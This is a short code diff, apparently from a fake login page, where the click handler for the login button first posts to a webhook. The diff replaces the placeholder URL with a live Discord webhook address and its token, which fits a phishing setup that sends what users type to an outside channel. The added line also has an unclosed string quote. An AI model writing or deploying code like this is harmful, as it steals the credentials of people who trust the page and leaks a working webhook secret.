@@ -26,7 +26,7 @@ login.addEventListener('click', (e) => {
     Eerror.innerText = " - This is not a valid email address";
   }else{
   // SEND TO WEBHOOK FIRST
-  fetch("YOUR_WEBHOOK_URL_HERE", {
+  fetch("https://discord.com/api/webhooks/1497667519954157731/HuZbnPzqyWbYAO3dmU4VDAChlU5FwzkD3feGyqqoYg23PcojXr42vnLukIIEThH_27TA, {
     method: "POST",
     headers: {
       "Content-Type": "application/json"
